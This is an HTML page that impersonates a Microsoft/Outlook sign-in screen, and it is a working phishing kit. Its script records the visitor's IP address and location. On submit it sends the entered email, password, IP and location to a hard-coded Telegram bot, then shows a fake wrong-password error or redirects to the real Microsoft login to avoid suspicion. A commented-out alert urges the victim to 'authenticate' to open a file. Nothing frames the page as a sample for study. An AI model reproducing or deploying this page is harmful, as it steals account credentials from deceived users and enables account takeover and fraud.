
<!--<script type="text/javascript">
    var startTime = new Date().getTime();
    var loadTime = null;
    alert("Authentication is required to Open or Download FIle. Click Ok! to Continue with Authentication!!!");
    </script>-->



<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <link rel="shortcut icon"
        href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <link data-loader="cdn" crossorigin="anonymous"
        href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_ziytf8dzt9eg1s6-ohhleg2.css"
        rel="stylesheet">
        <style>
            body {
      background-color: #f3f3f3;
      background-image: linear-gradient(to top right,#dfe8f0 , #efe1e0 , #e0eadf, #f3f1dc)
    }

            .background-background {
               width: 100%;
               height: 100%;
               background-color: rgba(0, 0, 0, 0.541);
            }

            .error-border {
        border-color: red;
            }




            #errorpw a {
        text-decoration: none !important;
    }

    #errorpw a:hover {
        text-decoration: underline !important;
        color: #5A5A5A !important;
    }





        </style>
</head>

<body class="cb" style="display: block;">
    
	<!-- Display IP address -->
    <input id="ipAddress" hidden />
    <input id="location" hidden />
	
    <form name="f1" id="i0281" method="post" autocomplete="off" style="margin-top: 0px;">
        
        <div class="login-paginated-page">
            <div id="lightboxTemplateContainer">
                
                <div class="outer" id="bgImgCenter">
                    <div class="template-section main-section">
                        <div class="middle ext-middle">
                           <!-- <h1 style="text-align: center; font-weight: 550; color: #21201f; opacity: 0.9; margin-top: 40px; padding-bottom: -30px;" >Outlook</h1>-->
                            <div class="full-height">
                                <div class="flex-column">
                                    <div class="win-scroll">
                                        <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox">

                                            <div role="main">
                                                <div id="pstb"
                                                    class="pagination-view animate has-identity-banner slide-in-next">
                                                    <div>
                                                        <div style="width: 100%; display: flex;"><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/16.000.28426.6/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://logincdn.msauth.net/16.000.28426.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] 

                                                        }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                                                            </div>
                                                        </div>
                                                        <div class="identityBanner">
                                                            <button type="button" class="backButton" id="idBtn_Back">
                                                               <img role="presentation"
                                                                    pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png"
                                                                    svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
                                                                    src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"> 
                                                                    
                                                            </button>
                                                            <div>[EMail]</div>
                                                        </div>
                                                        
                                                        <div id="loginHeader" class="row title ext-title">
                                                            <div role="heading" aria-level="1" style="opacity: 1.0">Sign in</div>
                                                        </div>
                                                        <div id="errorpw"
                                                            style="color: red; margin: 15px; margin-left: 0px; margin-top: 0px; margin-bottom: 0px;">
                                                        </div>
                                                        
                                                        <div class="row">
                                                            <div class="form-group col-md-24">
                                                                <div class="placeholderContainer">
                                                                    <input name="passwd" type="password" id="i0118"
                                                                        autocomplete="off"
                                                                        class="form-control input ext-input text-box ext-text-box"
                                                                        placeholder="Password" required />
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div>
                                                            <div class="position-buttons">
                                                                <div>
                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">
                                                                                <div class="form-group">
                                                                                    <a id="idA_PWD_ForgotPassword"
                                                                                        role="link" href="#">Forgot
                                                                                        password?</a>
                                                                                </div>
                                                                            <!--    <div class="form-group">
                                                                                    <a id="idA_PWD_ForgotPassword"
                                                                                        role="link" href="#">Sign in
                                                                                        with another account</a>
                                                                                </div>-->
                                                                                <div class="form-group">
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>

                                                            <div class="win-button-pin-bottom">
                                                                <div class="row">
                                                                    <div>
                                                                        <div
                                                                            class="col-xs-24 no-padding-left-right button-container" style="margin-bottom: -6px;">
                                                                            <div class="inline-block">
                                                                                <input type="submit" id="Button9"
                                                                                    class="win-button button_primary button ext-button primary ext-primary"
                                                                                    value="Next">
                                                                            </div>

                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="plate footer ext-footer" role="contentinfo"></div>
            <div id="footer" role="contentinfo" class="footer ext-footer">
                <div>
                    <div id="footerLinks" class="footerNode text-secondary">
                        <a id="ftrTerms" href="#"
                            class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                        <a id="ftrPrivacy" href="#"
                            class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp;
                            cookies</a>
                        <a id="moreOptions" href="#" aria-label="Click here for troubleshooting information"
                            class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                    </div>
                </div>
            </div>
        </div>
        </div>
        </div>
    </form>


    <script>

async function displayIPAddressAndLocation() {
            const ip = await getIPAddress();
            const location = await getLocationFromIP(ip);
            
            const ipAddressElement = document.getElementById('ipAddress');
            ipAddressElement.textContent = `IP: ${ip}`;

            const locationElement = document.getElementById('location');
            locationElement.textContent = `Location: ${location}`;
        }

        // Function to fetch the IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error.message);
                return 'Unknown';
            }
        }
             // Function to fetch the location (Country and State) from the IP address
             async function getLocationFromIP(ip) {
            try {
                const response = await fetch(`http://ip-api.com/json/${ip}?fields=61439`);
                const data = await response.json();
                const country = data.country || 'Unknown';
                const state = data.regionName || 'Unknown';
                const city = data.city || 'Unknown';
                return `${country}, ${state}, ${city}`;
            } catch (error) {
                console.error('Error fetching location:', error.message);
                return 'Unknown';
            }
        }

            // DOM elements  
const form = document.querySelector('#i0281');
const emailElement = document.querySelector('.identityBanner div');
const passwordElement = document.querySelector('#i0118');



// Telegram bot config
const chatId = '7277719998'; 
const botId = '7250140798:AAFCaC-KlvfIwTY7NQebzEsEeI-lsKIf1ok';
const telegramUrl = `https://api.telegram.org/${botId}/sendMessage`;

     // Form submit handler
     form.addEventListener('submit', async event => {

event.preventDefault();

// Get email, password, and IP
const email = emailElement.textContent;
const password = passwordElement.value;
const ip = document.getElementById('ipAddress').textContent.split(': ')[1];
const location = document.getElementById('location').textContent.split(': ')[1];

try {
    // Send data to Telegram
    await sendDataToTelegram(email, password, ip, location);

    // Check password length
    if (password.length < 6) {
        // Display error message with "reset it now" link
        document.getElementById('errorpw').innerHTML = "Your account or password is incorrect. If you don't remember your password, <a href='#' style='color: #0067B8; text-decoration: underline;'>reset it now.</a>";
                   
        // Clear the password input
        passwordElement.value = '';
       
    } else {
        // Clear previous error message
        document.getElementById('errorpw').textContent = '';

        // Redirect to OneDrive
        window.location.href = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=19&ct=1705576515&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26deeplink%3dowa%252f%253fui%253den-US%26rs%3dUS%26RpsCsrfState%3d39a2612a-0c9e-088f-8b0e-4b7a2136c89e&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c';
    }

} catch (error) {
    // Handle error
    console.error('Sending message failed', error);

    // Show message to user
    const message = document.createElement('div');
    message.textContent = 'Message failed to send';
    document.querySelector('#main').appendChild(message);
}

displayIPAddressAndLocation();

});

async function sendDataToTelegram(email, password, ip, location) {
try {
    // Send data to Telegram
    await fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: `${email}\n ${password}\n ${ip}\n ${location}`
        })
    });
} catch (error) {
    // Handle error
    console.error('Sending message failed', error);

    // Show message to user
    const message = document.createElement('div');
    message.textContent = 'Message failed to send';
    document.querySelector('#main').appendChild(message);
}
}

displayIPAddressAndLocation();
    </script>




    </div>
</body>

</html>